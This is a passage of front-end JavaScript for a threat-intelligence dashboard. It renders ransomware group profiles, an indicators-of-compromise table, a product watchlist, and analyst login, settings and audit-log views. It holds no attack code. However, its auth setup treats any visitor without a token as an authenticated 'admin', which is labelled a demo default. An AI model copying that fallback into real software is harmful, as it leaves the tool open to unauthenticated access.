      <div class="space-y-1">
        <h4 class="text-sm font-bold text-white">${escapeHtml(v.post_title)}</h4>
        <div class="flex items-center gap-3 text-[11px] text-slate-400">
          <span>Sector: <strong class="text-slate-300">${escapeHtml(v.activity)}</strong></span>
          <span>Country: <strong class="text-cyber-cyan">${escapeHtml(v.country)}</strong></span>
        </div>
        <p class="text-xs text-slate-300 line-clamp-2">${escapeHtml(v.description)}</p>
      </div>
    </div>
  `).join('');

  if (window.lucide) window.lucide.createIcons();
}

function renderDarkwebGroups() {
  const container = document.getElementById('dw-groups-grid');
  if (!container) return;

  container.innerHTML = darkwebData.groups.map(g => `
    <div class="rounded-2xl border border-cyber-border bg-cyber-card p-5 space-y-3">
      <div class="flex items-center justify-between border-b border-cyber-border/60 pb-2.5">
        <div class="flex items-center gap-2">
          <span class="text-base font-bold text-white">${escapeHtml(g.name)}</span>
          <span class="text-xs text-slate-500">(${escapeHtml(g.alias)})</span>
        </div>
        <span class="px-2 py-0.5 rounded text-[10px] font-bold ${g.threat_level === 'CRITICAL' ? 'bg-red-500/20 text-red-400 border border-red-500/40' : 'bg-amber-500/20 text-amber-400 border border-amber-500/40'}">${g.threat_level} THREAT</span>
      </div>
      <p class="text-xs text-slate-300">${escapeHtml(g.description)}</p>
      <div class="grid grid-cols-2 gap-2 text-[11px] bg-[#070b14] p-3 rounded-xl border border-cyber-border">
        <div><span class="text-slate-500">Extortion:</span> <span class="text-white font-bold">${escapeHtml(g.extortion_model)}</span></div>
        <div><span class="text-slate-500">Typical Demand:</span> <span class="text-amber-300 font-bold">${escapeHtml(g.typical_ransom)}</span></div>
        <div><span class="text-slate-500">Initial Access:</span> <span class="text-slate-300">${escapeHtml(g.initial_access)}</span></div>
        <div><span class="text-slate-500">File Extension:</span> <code class="text-cyber-cyan font-bold">${escapeHtml(g.extension)}</code></div>
      </div>
      <div class="space-y-1 text-[11px]">
        <span class="text-slate-500">Top MITRE TTPs:</span>
        <div class="flex flex-wrap gap-1.5 pt-0.5">
          ${g.mitre_ttps.map(t => `<span class="px-2 py-0.5 rounded bg-white/5 border border-cyber-border text-slate-300 text-[10px]">${escapeHtml(t)}</span>`).join('')}
        </div>
      </div>
    </div>
  `).join('');

  if (window.lucide) window.lucide.createIcons();
}

function renderDarkwebIocs() {
  const container = document.getElementById('dw-iocs-table-container');
  if (!container) return;

  container.innerHTML = `
    <table class="w-full text-left border-collapse text-xs">
      <thead>
        <tr class="border-b border-cyber-border/80 text-[10px] text-slate-500 uppercase">
          <th class="py-2.5 px-3">Indicator (IoC)</th>
          <th class="py-2.5 px-3">Type</th>
          <th class="py-2.5 px-3">Threat Actor</th>
          <th class="py-2.5 px-3">Category</th>
          <th class="py-2.5 px-3">Description</th>
          <th class="py-2.5 px-3 text-right">Pivot Action</th>
        </tr>
      </thead>
      <tbody class="divide-y divide-cyber-border/60">
        ${darkwebData.iocs.map(ioc => `
          <tr class="hover:bg-white/5 transition">
            <td class="py-2.5 px-3 font-mono font-bold text-white select-all">${escapeHtml(ioc.ioc)}</td>
            <td class="py-2.5 px-3 text-[10px] uppercase font-bold text-slate-400">${escapeHtml(ioc.type)}</td>
            <td class="py-2.5 px-3"><span class="px-2 py-0.5 rounded text-[10px] font-bold bg-red-500/15 text-red-400 border border-red-500/30">${escapeHtml(ioc.threat_actor)}</span></td>
            <td class="py-2.5 px-3 text-slate-300">${escapeHtml(ioc.category)}</td>
            <td class="py-2.5 px-3 text-slate-400 text-[11px] max-w-xs truncate">${escapeHtml(ioc.description)}</td>
            <td class="py-2.5 px-3 text-right">
              <button onclick="pivotDarkwebIocToTriage('${escapeHtml(ioc.ioc)}')" class="px-2.5 py-1 rounded bg-cyber-cyan/15 hover:bg-cyber-cyan/25 text-cyber-cyan border border-cyber-cyan/40 text-[10px] font-bold transition">
                Triage IoC
              </button>
            </td>
          </tr>
        `).join('')}
      </tbody>
    </table>
  `;

  if (window.lucide) window.lucide.createIcons();
}

function pivotDarkwebIocToTriage(ioc) {
  switchTab('triage');
  const input = document.getElementById('raw-input');
  if (input) {
    input.value = ioc;
    if (typeof runScan === 'function') runScan();
  }
}

// =========================================================================
// 7. WATCHLIST MANAGER UI & ITEM-BY-ITEM CRUD
// =========================================================================
let catalogProducts = [];

async function openAddWatchlistModal() {
  const modal = document.getElementById('modal-add-watchlist');
  if (modal) modal.classList.remove('hidden');

  if (catalogProducts.length === 0) {
    try {
      const res = await fetch('/api/watchlist/catalog');
      const data = await res.json();
      catalogProducts = data.catalog || [];
      const datalist = document.getElementById('catalog-products-list');
      if (datalist) {
        datalist.innerHTML = catalogProducts.map(p => `<option value="${escapeHtml(p.product)}">${escapeHtml(p.vendor)} (${escapeHtml(p.category)})</option>`).join('');
      }
    } catch (e) {
      console.error('Failed to load catalog for autocomplete:', e);
    }
  }

  if (window.lucide) window.lucide.createIcons();
}

function closeAddWatchlistModal() {
  document.getElementById('modal-add-watchlist')?.classList.add('hidden');
}

async function saveWatchlistItem() {
  const productEl = document.getElementById('add-wl-product');
  const product = productEl ? productEl.value.trim() : '';
  const vendor = document.getElementById('add-wl-vendor')?.value.trim() || '';
  const version = document.getElementById('add-wl-version')?.value.trim() || '';
  const owner = document.getElementById('add-wl-owner')?.value.trim() || 'Internal Enterprise';
  const criticality = document.getElementById('add-wl-criticality')?.value || 'normal';
  const category = document.getElementById('add-wl-category')?.value.trim() || '';
  const note = document.getElementById('add-wl-note')?.value.trim() || '';

  if (!product) {
    alert('Please enter product name.');
    return;
  }

  try {
    const resp = await fetch('/api/watchlist/item', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ product, vendor, version, owner, criticality, category, note })
    });
    const data = await resp.json();
    if (resp.ok) {
      closeAddWatchlistModal();
      if (typeof loadWatchlistSummary === 'function') await loadWatchlistSummary();
      renderWatchlistTableView();
      alert('Product successfully added to watchlist!');
    } else {
      alert('Failed to save item: ' + (data.detail || 'Unknown error'));
    }
  } catch (e) {
    alert('Error saving item: ' + e.message);
  }
}

async function deleteWatchlistItem(assetId, owner) {
  if (!confirm(`Are you sure you want to remove ${assetId} (${owner || 'all'}) from the watchlist?`)) return;

  try {
    const resp = await fetch('/api/watchlist/item', {
      method: 'DELETE',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ asset_id: assetId, owner })
    });
    if (resp.ok) {
      if (typeof loadWatchlistSummary === 'function') await loadWatchlistSummary();
      renderWatchlistTableView();
    } else {
      alert('Failed to delete item.');
    }
  } catch (e) {
    alert('Error: ' + e.message);
  }
}

async function seedWatchlistDefaults() {
  if (!confirm('Load standard enterprise defaults (FortiOS, PAN-OS, Exchange, Windows Server, ESXi, Cisco IOS XE, Ivanti, Log4j)?')) return;

  try {
    const resp = await fetch('/api/watchlist/defaults', { method: 'POST' });
    const data = await resp.json();
    if (resp.ok) {
      if (typeof loadWatchlistSummary === 'function') await loadWatchlistSummary();
      renderWatchlistTableView();
      alert(`Successfully loaded ${data.seeded_count} popular enterprise tools into watchlist!`);
    }
  } catch (e) {
    alert('Failed to seed defaults: ' + e.message);
  }
}

function viewWatchlistInCyberFeeds() {
  if (typeof switchTab === 'function') switchTab('feed');
  if (typeof setFeedMode === 'function') setFeedMode('critical');
  const searchInput = document.getElementById('feed-search-input');
  if (searchInput) {
    searchInput.value = '';
    if (typeof filterFeedArticles === 'function') filterFeedArticles();
  }
}

function filterFeedByWatchlistProduct(productName) {
  if (typeof switchTab === 'function') switchTab('feed');
  if (typeof setFeedMode === 'function') setFeedMode('critical');
  const searchInput = document.getElementById('feed-search-input');
  if (searchInput) {
    searchInput.value = productName;
    if (typeof filterFeedArticles === 'function') filterFeedArticles();
  }
}

async function renderWatchlistTableView() {
  if (typeof loadWatchlistSummary === 'function') await loadWatchlistSummary();

  // If feed articles not preloaded yet, fetch them to count live mentions
  if (typeof allFeedArticles === 'undefined' || !allFeedArticles || allFeedArticles.length === 0) {
    try {
      const res = await fetch('/api/feed?source=all&limit=200');
      if (res.ok) {
        const data = await res.json();
        window.allFeedArticles = data.items || [];
      }
    } catch (e) {
      // silent fallback
    }
  }

  const container = document.getElementById('watchlist-table-container');
  const countEl = document.getElementById('wl-table-count');
  const ownerFilter = document.getElementById('wl-filter-owner')?.value || '';
  const critFilter = document.getElementById('wl-filter-crit')?.value || '';
  const searchFilter = (document.getElementById('wl-filter-search')?.value || '').toLowerCase().trim();

  if (!container) return;

  // Populate owner filter options
  const ownerSelect = document.getElementById('wl-filter-owner');
  if (ownerSelect && ownerSelect.options.length <= 1 && typeof watchlistSummary !== 'undefined' && watchlistSummary) {
    (watchlistSummary.owners || []).forEach(o => {
      const opt = document.createElement('option');
      opt.value = o;
      opt.innerText = o;
      ownerSelect.appendChild(opt);
    });
  }

  let assets = (typeof watchlistSummary !== 'undefined' && watchlistSummary && watchlistSummary.assets) ? watchlistSummary.assets : [];

  // Apply filters
  if (ownerFilter) {
    assets = assets.filter(a => (a.owners || []).some(o => o.toLowerCase() === ownerFilter.toLowerCase()));
  }
  if (critFilter) {
    assets = assets.filter(a => (a.criticality || '').toLowerCase() === critFilter.toLowerCase());
  }
  if (searchFilter) {
    assets = assets.filter(a => 
      (a.product || '').toLowerCase().includes(searchFilter) ||
      (a.vendor || '').toLowerCase().includes(searchFilter) ||
      (a.deployments || []).some(d => (d.version || '').toLowerCase().includes(searchFilter))
    );
  }

  if (countEl) countEl.innerText = assets.length;

  if (assets.length === 0) {
    container.innerHTML = `
      <div class="p-8 text-center space-y-3 text-xs">
        <div class="text-slate-400">No watchlist products match current filters.</div>
        <button onclick="seedWatchlistDefaults()" class="px-4 py-2 rounded-xl bg-amber-500/20 text-amber-300 border border-amber-500/40 font-bold hover:bg-amber-500/30 transition">
          Load Popular Enterprise Defaults
        </button>
      </div>
    `;
    return;
  }

  const critStyles = {
    critical: 'bg-red-500/20 text-red-400 border-red-500/40',
    high: 'bg-amber-500/20 text-amber-400 border-amber-500/40',
    normal: 'bg-blue-500/20 text-blue-400 border-blue-500/40'
  };

  container.innerHTML = `
    <table class="w-full text-left border-collapse text-xs">
      <thead>
        <tr class="border-b border-cyber-border/80 text-[10px] text-slate-500 uppercase">
          <th class="py-2.5 px-3">Criticality</th>
          <th class="py-2.5 px-3">Product & Vendor</th>
          <th class="py-2.5 px-3">Category</th>
          <th class="py-2.5 px-3">Deployments (Owner & Version)</th>
          <th class="py-2.5 px-3 text-center">Threat Feeds</th>
          <th class="py-2.5 px-3 text-right">Actions</th>
        </tr>
      </thead>
      <tbody class="divide-y divide-cyber-border/60">
        ${assets.map(a => {
          const prodName = a.product || '';
          const prodLower = prodName.toLowerCase();
          const feedMatches = (typeof allFeedArticles !== 'undefined' && Array.isArray(allFeedArticles))
            ? allFeedArticles.filter(art =>
                (art.watchlist_matches || []).some(m => (m.product || '').toLowerCase() === prodLower) ||
                ((art.title || '') + ' ' + (art.summary || '')).toLowerCase().includes(prodLower)
              ).length
            : 0;

          return `
          <tr class="hover:bg-white/5 transition">
            <td class="py-3 px-3">
              <span class="px-2 py-0.5 rounded text-[10px] font-bold border ${critStyles[a.criticality] || critStyles.normal}">
                ${(a.criticality || 'normal').toUpperCase()}
              </span>
            </td>
            <td class="py-3 px-3">
              <div class="font-bold text-white text-xs">${escapeHtml(prodName)}</div>
              <div class="text-[11px] text-slate-400">${escapeHtml(a.vendor || 'Custom')}</div>
            </td>
            <td class="py-3 px-3 text-slate-300">${escapeHtml(a.category || 'General')}</td>
            <td class="py-3 px-3 space-y-1">
              ${(a.deployments || []).map(d => `
                <div class="text-[11px] font-mono text-slate-300 flex items-center gap-1.5">
                  <span class="px-1.5 py-0.5 rounded bg-white/5 border border-cyber-border text-slate-400 font-bold">${escapeHtml(d.owner)}</span>
                  ${d.version ? `<span class="text-cyber-cyan font-bold">v${escapeHtml(d.version)}</span>` : '<span class="text-slate-600">(no version)</span>'}
                  ${d.note ? `<span class="text-slate-500">- ${escapeHtml(d.note)}</span>` : ''}
                  <button onclick="deleteWatchlistItem('${escapeHtml(a.id)}', '${escapeHtml(d.owner)}')" class="text-slate-600 hover:text-red-400 ml-1" title="Remove deployment"><i data-lucide="x" class="w-3 h-3"></i></button>
                </div>
              `).join('')}
            </td>
            <td class="py-3 px-3 text-center">
              ${feedMatches > 0 ? `
                <button onclick="filterFeedByWatchlistProduct('${escapeHtml(prodName)}')" class="inline-flex items-center gap-1.5 px-2.5 py-1 rounded-lg bg-amber-500/15 hover:bg-amber-500/25 text-amber-300 border border-amber-500/40 text-[11px] font-bold transition group" title="Lihat ${feedMatches} artikel terkait ${escapeHtml(prodName)} di Cyber Feeds">
                  <i data-lucide="newspaper" class="w-3.5 h-3.5 text-amber-400"></i>
                  <span>${feedMatches} Articles</span>
                  <i data-lucide="arrow-up-right" class="w-3 h-3 group-hover:translate-x-0.5 transition-transform"></i>
                </button>
              ` : `
                <button onclick="filterFeedByWatchlistProduct('${escapeHtml(prodName)}')" class="inline-flex items-center gap-1.5 px-2.5 py-1 rounded-lg bg-white/5 hover:bg-white/10 text-slate-400 hover:text-white border border-cyber-border text-[11px] transition" title="Cari artikel menyebut ${escapeHtml(prodName)} di Cyber Feeds">
                  <i data-lucide="search" class="w-3 h-3"></i>
                  <span>Search Feeds</span>
                </button>
              `}
            </td>
            <td class="py-3 px-3 text-right">
              <button onclick="deleteWatchlistItem('${escapeHtml(a.id)}')" class="px-2.5 py-1 rounded bg-white/5 hover:bg-red-500/20 text-slate-400 hover:text-red-400 border border-cyber-border text-[10px] font-bold transition">
                Delete
              </button>
            </td>
          </tr>
        `}).join('')}
      </tbody>
    </table>
  `;

  if (window.lucide) window.lucide.createIcons();
}


// =============================================================================
// WEB LOGIN, SESSION MANAGEMENT, & TERMINAL LOCK
// =============================================================================

let currentAnalyst = {
  username: 'admin',
  role: 'Tier-2 SOC',
  authenticated: false
};
let sessionInactivityTimer = null;
let inactivityTimeoutMs = 60 * 60 * 1000; // default 60 mins

function getAuthToken() {
  return sessionStorage.getItem('lazysoc_token') || localStorage.getItem('lazysoc_token') || '';
}

function setAuthToken(token, persist = false) {
  sessionStorage.setItem('lazysoc_token', token);
  if (persist) {
    localStorage.setItem('lazysoc_token', token);
  }
}

function clearAuthToken() {
  sessionStorage.removeItem('lazysoc_token');
  localStorage.removeItem('lazysoc_token');
}

async function initAnalystAuth() {
  const token = getAuthToken();
  if (token) {
    try {
      const resp = await fetch('/api/auth/session', {
        headers: { 'Authorization': `Bearer ${token}` }
      });
      if (resp.ok) {
        const data = await resp.json();
        if (data.authenticated && data.analyst) {
          currentAnalyst = { ...data.analyst, authenticated: true };
          updateAnalystUI();
        }
      }
    } catch (e) {
      console.warn('Session verification error:', e);
    }
  } else {
    // Default analyst handle for demo
    currentAnalyst = { username: 'admin', role: 'Tier-2 SOC', authenticated: true };
    updateAnalystUI();
  }

  // Setup auto-lock event listeners
  resetInactivityTimer();
  ['mousedown', 'keydown', 'scroll', 'touchstart'].forEach(evt => {
    document.addEventListener(evt, resetInactivityTimer, { passive: true });
  });

  // Global keyboard shortcuts: Ctrl+L (Lock), Ctrl+, (Settings)
  document.addEventListener('keydown', (e) => {
    if ((e.ctrlKey || e.metaKey) && (e.key === 'l' || e.key === 'L')) {
      e.preventDefault();
      lockTerminal();
    }
    if ((e.ctrlKey || e.metaKey) && e.key === ',') {
      e.preventDefault();
      openSettingsModal();
    }
  });

  // Close dropdowns on outside click
  document.addEventListener('click', (e) => {
    const analystBtn = document.getElementById('analyst-badge-btn');
    const analystDrop = document.getElementById('analyst-dropdown');
    if (analystDrop && !analystDrop.classList.contains('hidden')) {
      if (analystBtn && !analystBtn.contains(e.target) && !analystDrop.contains(e.target)) {
        analystDrop.classList.add('hidden');
      }
    }
  });
}

function resetInactivityTimer() {
  if (sessionInactivityTimer) clearTimeout(sessionInactivityTimer);
  if (inactivityTimeoutMs > 0) {
    sessionInactivityTimer = setTimeout(() => {
      lockTerminal();
    }, inactivityTimeoutMs);
  }
}

function updateAnalystUI() {
  const nameEl = document.getElementById('current-analyst-name');
  const roleEl = document.getElementById('current-analyst-role');
  const menuName = document.getElementById('menu-analyst-name');
  const menuRole = document.getElementById('menu-analyst-role');

  if (nameEl) nameEl.innerText = currentAnalyst.username;
  if (roleEl) roleEl.innerText = currentAnalyst.role.toUpperCase();
  if (menuName) menuName.innerText = currentAnalyst.username;
  if (menuRole) menuRole.innerText = currentAnalyst.role;
}

function toggleAnalystDropdown(event) {
  if (event) event.stopPropagation();
  const dropdown = document.getElementById('analyst-dropdown');
  if (dropdown) dropdown.classList.toggle('hidden');
}

function quickFillLogin(username, password, role) {
  const uInput = document.getElementById('auth-username');
  const pInput = document.getElementById('auth-password');
  const rInput = document.getElementById('auth-role');
  if (uInput) uInput.value = username;
  if (pInput) pInput.value = password;
  if (rInput) rInput.value = role;
}

function openLoginModal(locked = false) {
  const modal = document.getElementById('analyst-auth-modal');
  const alertEl = document.getElementById('login-error-alert');
  if (alertEl) alertEl.classList.add('hidden');
  if (modal) modal.classList.remove('hidden');
  if (window.lucide) window.lucide.createIcons();
}

function closeLoginModal() {
  const modal = document.getElementById('analyst-auth-modal');
  if (modal) modal.classList.add('hidden');
}

function lockTerminal() {
  currentAnalyst.authenticated = false;
  openLoginModal(true);
}

async function handleAnalystLogin(event) {
  event.preventDefault();
  const uInput = document.getElementById('auth-username');
  const pInput = document.getElementById('auth-password');
  const rInput = document.getElementById('auth-role');
  const alertEl = document.getElementById('login-error-alert');
  const alertText = document.getElementById('login-error-text');
  const submitBtn = document.getElementById('btn-login-submit');

  const username = uInput ? uInput.value.trim() : '';
  const password = pInput ? pInput.value : '';
  const role = rInput ? rInput.value : 'Tier-2 SOC';

  if (!username || !password) return;

  if (submitBtn) {
    submitBtn.disabled = true;
    submitBtn.innerHTML = `<span class="animate-spin inline-block w-4 h-4 border-2 border-current border-t-transparent rounded-full mr-2"></span> Authenticating...`;
  }

  try {
    const resp = await fetch('/api/auth/login', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ username, password, role })
    });

    const data = await resp.json();

    if (resp.ok && data.success) {
      setAuthToken(data.token, true);
      currentAnalyst = { ...data.analyst, authenticated: true };
      updateAnalystUI();
      closeLoginModal();
      if (alertEl) alertEl.classList.add('hidden');
    } else {
      if (alertEl && alertText) {
        alertText.innerText = data.detail || data.error || 'Authentication failed. Please check credentials.';
        alertEl.classList.remove('hidden');
      }
    }
  } catch (err) {
    if (alertEl && alertText) {
      alertText.innerText = 'Network error or server unavailable: ' + err.message;
      alertEl.classList.remove('hidden');
    }
  } finally {
    if (submitBtn) {
      submitBtn.disabled = false;
      submitBtn.innerHTML = `<i data-lucide="key" class="w-4 h-4"></i> <span>Authenticate & Unlock Terminal</span>`;
      if (window.lucide) window.lucide.createIcons();
    }
  }
}

async function handleAnalystLogout() {
  const token = getAuthToken();
  if (token) {
    try {
      await fetch('/api/auth/logout', {
        method: 'POST',
        headers: { 'Authorization': `Bearer ${token}` }
      });
    } catch (e) {
      // ignore
    }
  }
  clearAuthToken();
  currentAnalyst = { username: 'Analyst', role: 'Locked', authenticated: false };
  updateAnalystUI();
  openLoginModal(true);
}

// =============================================================================
// SYSTEM SETTINGS & SECURITY HARDENING MANAGER
// =============================================================================

function openSettingsModal() {
  const modal = document.getElementById('modal-settings');
  if (modal) {
    modal.classList.remove('hidden');
    loadSettingsData();
    if (window.lucide) window.lucide.createIcons();
  }
}

function closeSettingsModal() {
  const modal = document.getElementById('modal-settings');
  if (modal) modal.classList.add('hidden');
}

function switchSettingsTab(tabName) {
  const tabs = ['keys', 'security', 'audit', 'users'];
  tabs.forEach(t => {
    const view = document.getElementById(`set-view-${t}`);
    const btn = document.getElementById(`set-tab-${t}`);
    if (view) view.classList.add('hidden');
    if (btn) {
      btn.className = 'px-3 py-1.5 rounded-lg font-bold text-slate-400 hover:text-white flex items-center gap-1.5 transition whitespace-nowrap';
    }
  });

  const activeView = document.getElementById(`set-view-${tabName}`);
  const activeBtn = document.getElementById(`set-tab-${tabName}`);
  if (activeView) activeView.classList.remove('hidden');
  if (activeBtn) {
    activeBtn.className = 'px-3 py-1.5 rounded-lg font-bold bg-cyber-cyan/15 text-cyber-cyan border border-cyber-cyan/30 flex items-center gap-1.5 transition whitespace-nowrap';
  }

  if (tabName === 'audit') {
    loadAuditLogs();
  } else if (tabName === 'users') {
    loadUserManagementData();
  }
  if (window.lucide) window.lucide.createIcons();
}

async function loadSettingsData() {
  try {
    const resp = await fetch('/api/settings');
    if (!resp.ok) return;
    const data = await resp.json();

    // Populate air-gap toggle
    const airgapToggle = document.getElementById('set-toggle-airgap');
    if (airgapToggle) {
      airgapToggle.checked = !!(data.settings && data.settings.air_gap_mode);
    }

    // Populate timeout
    const timeoutSelect = document.getElementById('set-timeout-minutes');
    if (timeoutSelect && data.settings && data.settings.session_timeout_minutes !== undefined) {
      timeoutSelect.value = String(data.settings.session_timeout_minutes);
      inactivityTimeoutMs = parseInt(data.settings.session_timeout_minutes, 10) * 60 * 1000;
    }

    // Populate API Key pools
    const keysContainer = document.getElementById('settings-keys-list');
    if (keysContainer && data.api_pools) {
      const services = Object.entries(data.api_pools);
      if (services.length === 0) {
        keysContainer.innerHTML = `<div class="col-span-full text-slate-500 text-xs">No external API pools configured.</div>`;
      } else {
        keysContainer.innerHTML = services.map(([svc, pool]) => {
          const total = (pool.active || 0) + (pool.rate_limited || 0) + (pool.invalid || 0);
          const isHealthy = pool.active > 0;
          return `
            <div class="p-3 rounded-xl bg-white/5 border border-cyber-border flex items-center justify-between">
              <div>
                <div class="font-bold text-white uppercase text-xs flex items-center gap-2">
                  <span class="w-2 h-2 rounded-full ${isHealthy ? 'bg-emerald-400' : 'bg-amber-400'}"></span>
                  ${escapeHtml(svc)}
                </div>
                <div class="text-[10px] text-slate-400 mt-0.5">
                  ${pool.active || 0} active · ${pool.rate_limited || 0} cooldown · ${pool.invalid || 0} invalid
                </div>
              </div>
              <span class="px-2 py-0.5 rounded text-[10px] font-bold border ${isHealthy ? 'bg-emerald-500/15 text-emerald-400 border-emerald-500/30' : 'bg-amber-500/15 text-amber-300 border-amber-500/30'}">
                ${isHealthy ? 'READY' : 'OFFLINE'}
              </span>
            </div>
          `;
        }).join('');
      }
    }
  } catch (err) {
    console.warn('Failed to load settings data:', err);
  }
}

async function saveApiKeyFromSettings() {
  const serviceEl = document.getElementById('new-key-service');
  const keyEl = document.getElementById('new-key-value');
  const service = serviceEl?.value || '';
  const key = keyEl?.value.trim() || '';

  if (!key) {
    alert('Please enter an API key.');
    return;
  }

  try {
    const resp = await fetch('/api/keys', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ service, key })
    });
    const data = await resp.json();
    if (resp.ok) {
      alert(`API key for ${service} added successfully!`);
      if (keyEl) keyEl.value = '';
      loadSettingsData();
    } else {
      alert('Failed to add key: ' + (data.detail || 'Access restricted. Configure via environment variables or server config.'));
    }
  } catch (e) {
    alert('Error saving API key: ' + e.message);
  }
}

async function toggleAirGapSetting(enabled) {
  try {
    const resp = await fetch('/api/settings', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ air_gap_mode: enabled })
    });
    if (resp.ok) {
      alert(`Air-Gapped Local Mode is now ${enabled ? 'ENABLED (All outbound queries blocked)' : 'DISABLED (Live intel active)'}.`);
    }
  } catch (e) {
    console.error('Failed to toggle air-gap mode:', e);
  }
}

async function updateSessionTimeoutSetting(minutes) {
  const mins = parseInt(minutes, 10);
  try {
    const resp = await fetch('/api/settings', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ session_timeout_minutes: mins })
    });
    if (resp.ok) {
      inactivityTimeoutMs = mins * 60 * 1000;
      resetInactivityTimer();
    }
  } catch (e) {
    console.error('Failed to update session timeout:', e);
  }
}

async function flushCacheRecords() {
  if (!confirm('Are you sure you want to flush all cached threat intelligence records?')) return;
  try {
    const resp = await fetch('/api/cache/flush', { method: 'POST' });
    const data = await resp.json();
    if (resp.ok) {
      alert(`Successfully purged ${data.purged_count} cached records.`);
      loadSettingsData();
    }
  } catch (e) {
    alert('Failed to flush cache: ' + e.message);
  }
}

async function loadAuditLogs() {
  const container = document.getElementById('settings-audit-container');
  if (!container) return;
  container.innerHTML = `<div class="p-4 text-center text-slate-500 font-mono text-xs">Loading audit trail...</div>`;

  try {
    const resp = await fetch('/api/audit-logs?limit=50');
    if (!resp.ok) throw new Error('HTTP ' + resp.status);
    const data = await resp.json();
    const logs = data.logs || [];

    if (logs.length === 0) {
      container.innerHTML = `<div class="p-4 text-center text-slate-500 text-xs">No audit logs recorded yet.</div>`;
      return;
    }

    const eventColors = {
      LOGIN_SUCCESS: 'text-emerald-400',
      LOGIN_FAILED: 'text-red-400',
      LOGIN_BLOCKED: 'text-rose-500 font-bold',
      LOGOUT: 'text-slate-400',
      SETTINGS_UPDATED: 'text-amber-300 font-bold',
      CACHE_CLEARED: 'text-purple-400',
      SYSTEM_STARTUP: 'text-cyber-cyan'
    };

    container.innerHTML = `
      <table class="w-full text-left border-collapse text-xs">
        <thead>
          <tr class="border-b border-cyber-border/80 text-[10px] text-slate-500 uppercase bg-white/5">
            <th class="py-2 px-3">Timestamp</th>
            <th class="py-2 px-3">Event</th>
            <th class="py-2 px-3">Analyst</th>
            <th class="py-2 px-3">IP</th>
            <th class="py-2 px-3">Details</th>
          </tr>
        </thead>
        <tbody class="divide-y divide-cyber-border/60 font-mono text-[11px]">
          ${logs.map(log => `
            <tr class="hover:bg-white/5 transition">
              <td class="py-2 px-3 text-slate-400 whitespace-nowrap">${escapeHtml(log.timestamp)}</td>
              <td class="py-2 px-3 font-bold ${eventColors[log.event] || 'text-slate-300'}">${escapeHtml(log.event)}</td>
              <td class="py-2 px-3 text-white font-bold">${escapeHtml(log.username)}</td>
              <td class="py-2 px-3 text-slate-400">${escapeHtml(log.ip || '127.0.0.1')}</td>
              <td class="py-2 px-3 text-slate-300">${escapeHtml(log.details)}</td>
            </tr>
          `).join('')}
        </tbody>
      </table>
    `;
  } catch (err) {
    container.innerHTML = `<div class="p-4 text-center text-red-400 text-xs">Failed to load audit logs: ${escapeHtml(err.message)}</div>`;
  }
}

// Auto-initialize when script loads
if (document.readyState === 'loading') {
  document.addEventListener('DOMContentLoaded', initAnalystAuth);
} else {
  initAnalystAuth();
}


// =============================================================================
// DARKWEB DOMAIN RECON & CREDENTIAL LEAK AUDIT
// =============================================================================

function setDomainSearchSample(sampleDomain) {
  const input = document.getElementById('dw-domain-search-input');
  if (input) {
    input.value = sampleDomain;
    runDomainDarkwebRecon();
  }
}

async function runDomainDarkwebRecon(event) {
  if (event) event.preventDefault();
  const input = document.getElementById('dw-domain-search-input');
  const container = document.getElementById('dw-domain-results-container');
  const submitBtn = document.getElementById('btn-domain-recon-submit');

  const domain = (input?.value || '').trim();
  if (!domain) return;

  if (submitBtn) {
    submitBtn.disabled = true;
    submitBtn.innerHTML = `<span class="animate-spin inline-block w-4 h-4 border-2 border-current border-t-transparent rounded-full mr-2"></span> Scanning Darkweb...`;
  }

  container.innerHTML = `
    <div class="p-8 text-center rounded-2xl border border-cyber-border bg-cyber-card space-y-3 font-mono">
      <div class="animate-spin inline-block w-8 h-8 border-4 border-purple-500 border-t-transparent rounded-full"></div>
      <div class="text-sm font-bold text-white">Scanning Tor Leak Blogs & Stealer Malware Telegram Streams...</div>
      <div class="text-xs text-slate-400">Auditing domain footprint: ${escapeHtml(domain)}</div>
    </div>
  `;

  try {
    const resp = await fetch('/api/darkweb/domain', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ domain })
    });

    const data = await resp.json();

    if (!resp.ok || !data.success) {
      container.innerHTML = `
        <div class="p-6 rounded-2xl border border-red-500/30 bg-red-500/10 text-red-300 text-xs">
          ${escapeHtml(data.error || 'Failed to complete domain darkweb recon.')}
        </div>
      `;
      return;
    }

    const isClean = data.threat_score === 0;
    const isCritical = data.threat_score >= 75;
    const isHigh = data.threat_score >= 50 && data.threat_score < 75;
    const badgeColor = isClean 
      ? 'bg-emerald-500/20 text-emerald-400 border-emerald-500/40' 
      : (isCritical ? 'bg-red-500/20 text-red-400 border-red-500/40' : (isHigh ? 'bg-amber-500/20 text-amber-300 border-amber-500/40' : 'bg-blue-500/20 text-blue-300 border-blue-500/40'));

    container.innerHTML = `
      <!-- SCORECARD -->
      <div class="rounded-2xl border border-cyber-border bg-cyber-card p-5 sm:p-6 space-y-4">
        <div class="flex flex-col sm:flex-row sm:items-center justify-between gap-3 border-b border-cyber-border/60 pb-3">
          <div>
            <div class="text-[10px] text-slate-400 uppercase tracking-wider font-bold">Domain Security Exposure Report</div>
            <h3 class="text-lg font-bold text-white flex items-center gap-2 mt-0.5">
              <span>🌐</span> ${escapeHtml(data.domain)}
            </h3>
            <div class="text-[11px] text-slate-400">Scanned on ${escapeHtml(data.analyzed_at)}</div>
          </div>
          <div class="flex items-center gap-3">
            <div class="text-right">
              <div class="text-[10px] text-slate-400 uppercase font-bold">Darkweb Threat Index</div>
              <div class="text-2xl font-bold ${isClean ? 'text-emerald-400' : (isCritical ? 'text-red-400' : (isHigh ? 'text-amber-400' : 'text-blue-400'))}">
                ${data.threat_score}<span class="text-sm text-slate-500 font-normal">/100</span>
              </div>
            </div>
            <span class="px-3 py-1.5 rounded-xl border text-xs font-bold ${badgeColor}">
              ${escapeHtml(data.verdict)}
            </span>
          </div>
        </div>

        ${data.status_note ? `
          <div class="p-3 rounded-xl ${isClean ? 'bg-emerald-500/10 border border-emerald-500/30 text-emerald-300' : 'bg-red-500/10 border border-red-500/30 text-red-300'} text-xs flex items-center gap-2">
